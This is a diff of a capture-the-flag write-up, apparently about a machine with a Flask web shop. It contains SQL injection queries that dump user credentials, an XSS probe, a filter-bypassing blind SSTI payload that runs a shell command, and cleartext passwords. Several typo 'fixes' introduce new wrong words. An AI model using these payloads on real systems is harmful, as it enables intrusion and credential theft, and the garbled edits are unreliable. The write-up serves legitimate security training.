@@ -40,7 +40,7 @@ Vary: Cookie
 Set-Cookie: session=eyJjYXJ0X2l0ZW1zIjpbXX0.YMsajA.QOGddQTsnFBCqN_3RTIpssfM3Mg; HttpOnly; Path=/ 
 ```
 
-it contians a token based cookie.
+it contains a token based cookie.
 
 Decoding it found that it is not jwt token
 ```bash
@@ -58,7 +58,7 @@ Another popular token based auth is flask-token, there is a tool to verify/decod
 
 ## XSS *not useful(?)*
 
-odd thing is that registerating page have character limit for username
+Registration page have character limit for username
 
 ![](screenshots/characters-limit.png)
 
@@ -76,7 +76,7 @@ because it injected in the html code, and get xss injection with `"><script>aler
 
 # Foothold
 
-Extract flask auth token secret key with ssti than exploit sql inection in auth token to get user creds. From admin panel found blind stti and get reverse shell.
+Extract flask auth token secret key with ssti than exploit sql inaction in auth token to get user creds. From admin panel found blind ssti and get reverse shell.
 
 ## SSTI
 
@@ -117,13 +117,13 @@ Testing for UNION based sql injection
 
 ![](screenshots/sql-injection.png)
 
-Exracting data from database
+Extracting data from database
 ```sql
 --get current database name
 UNION SELECT database()
 --extract tables from current db
 UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='shop'
---dump all colums from table
+--dump all columns from table
 UNION SELECT group_concat(column_name) from information_schema.columns where table_name ='users'
 --dump colum content
 UNION SELECT group_concat(uuid,':',name,':',password) from shop.users
@@ -144,17 +144,17 @@ found web directory from "View messages"
 
 * Good blog on [SSTI in jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
 
-Directory `/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal` takes to support fourm
+Directory `/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal` takes to support forum
 
 ![](screenshots/support-forum.png)
 
-"Contact number or email" field throughing some interesting error that relate to SSTI
+"Contact number or email" field through some interesting error that relate to SSTI
 
 ![](screenshots/fourm-error1.png)
 
 ![](screenshots/fourm-error2.png)
 
-Using some bypass techinques and replacing blocked characters
+Using some bypass techniques and replacing blocked characters
 
 "`{{ }}`" replaced with `%257B%257B %257D%257D` Double url encoded.
 
@@ -172,8 +172,8 @@ Because this is a blind SSTI we can not manually found the offset of required cl
 
 `with` allows common `try…except…finally` usage patterns to be encapsulated for convenient reuse. [EXAMPLE](https://www.geeksforgeeks.org/with-statement-in-python/)
 
-* Using **`with`** statement because it is smiller to `try` but in clean manner and also `try` is not supported in the template language. 
-* Get the syntex for `with` statement from jinja2 [docs](https://jinja.palletsprojects.com/en/3.0.x/templates/#with-statement)
+* Using **`with`** statement because it is smiler to `try` but in clean manner and also `try` is not supported in the template language. 
+* Get the syntax for `with` statement from jinja2 [docs](https://jinja.palletsprojects.com/en/3.0.x/templates/#with-statement)
 
       {% with %}
           {% set foo = 42 %}
@@ -181,7 +181,7 @@ Because this is a blind SSTI we can not manually found the offset of required cl
       {% endwith %}
 
 
-and final crafted payload, i use [decimal formated](https://www.ipaddressguide.com/ip) ip address because `.` is blocked.
+and final crafted payload, i use [decimal formate](https://www.ipaddressguide.com/ip) ip address because `.` is blocked.
 ```py
 {% with ssti = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ping -c 2 168431431")["read"]() %} %257B%257Bssti%257D%257D {% endwith %}
 ```
@@ -220,7 +220,7 @@ chiv:ch1VW4sHERE7331
 chivato:rghorsfruUEFHEfhes83214
 -->
 
-**Forward port 8080 with ssh** (*I use `cat` than `shift` + `~` + `c` to get into ssh prompt because i am using zsh, if you are using bash than you can directaly use `shift` + `~` + `c`*)
+**Forward port 8080 with ssh** (*I use `cat` than `shift` + `~` + `c` to get into ssh prompt because i am using zsh, if you are using bash than you can directly use `shift` + `~` + `c`*)
 
 ![](screenshots/port-forward.png)
 
@@ -234,7 +234,7 @@ Cookie decode with `flask-unsign` and get some xml data, which parsed with [lxml
 
 ## XXE to inject payload in auth token
 
-cookie contains xml and after some testing, notice that changing `version` value in post data parameter reflacted in the cookie. 
+cookie contains xml and after some testing, notice that changing `version` value in post data parameter reflated in the cookie. 
 
 ![](screenshots/inject-into-cookie.png)
 
